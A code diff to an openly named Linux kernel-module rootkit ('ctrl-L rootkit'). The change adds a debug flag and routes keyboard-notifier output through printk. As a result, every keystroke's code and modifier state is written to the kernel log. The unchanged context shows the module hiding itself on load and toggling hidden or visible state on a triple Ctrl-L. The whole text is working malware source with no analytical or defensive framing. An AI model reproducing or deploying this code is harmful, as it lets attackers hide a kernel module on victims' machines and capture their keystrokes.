@@ -24,6 +24,7 @@ void rootkit_unhide(void);
 
 static struct list_head *module_previous;
 static int hidden = 0;
+static int debug = 1;
 static int ctrll_count = 0;
 
 static struct notifier_block kb_blk = {
@@ -56,8 +57,10 @@ int kb_cb(struct notifier_block *nblock,
 {
 	struct keyboard_notifier_param *param = _param;
 
-	pr_debug("code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
-		 code, param->down, param->shift, param->value);
+	if (debug) {
+		printk(KERN_INFO "code: 0x%lx, down: 0x%x, shift: 0x%x, value: 0x%x\n",
+			code, param->down, param->shift, param->value);
+	}
 
 	// Make sure not to double up on key-up events
 	if (!(param->down))
@@ -67,13 +70,19 @@ int kb_cb(struct notifier_block *nblock,
 	if (param->value == 0x26 && param->shift == 4) {
 		ctrll_count++;
 		if (ctrll_count > 2) {
-			pr_info("CTRL-L pressed 3 times!!!\n");
+			if (debug) {
+				printk(KERN_INFO "CTRL-L pressed 3 times!!!\n");
+			}
 			if (hidden) {
-				pr_info("Unhiding CTRL-L rootkit\n");
+				if (debug) {
+					printk(KERN_INFO "Unhiding CTRL-L rootkit\n");
+				}
 				rootkit_unhide();
 			}
 			else {
-				pr_info("Hiding CTRL-L rootkit\n");
+				if (debug) {
+					printk(KERN_INFO "Hiding CTRL-L rootkit\n");
+				}
 				rootkit_hide();
 			}
 			ctrll_count = 0;
@@ -95,8 +104,9 @@ int kb_cb(struct notifier_block *nblock,
 static int __init ctrll_rootkit_init(void)
 {
     register_keyboard_notifier(&kb_blk);
-
-    printk(KERN_INFO "ctrl-L rootkit loaded\n");
+	if (debug) {
+ 	   printk(KERN_INFO "ctrl-L rootkit loaded\n");
+	}
     rootkit_hide();
     return 0;
 }
@@ -105,8 +115,9 @@ static int __init ctrll_rootkit_init(void)
 static void __exit ctrll_rootkit_exit(void) {
 
 	unregister_keyboard_notifier(&kb_blk);
-
-    printk(KERN_INFO "ctrl-L rootkit unloaded\n");
+	if (debug) {
+   		printk(KERN_INFO "ctrl-L rootkit unloaded\n");
+	}
 }
 
 module_init(ctrll_rootkit_init);
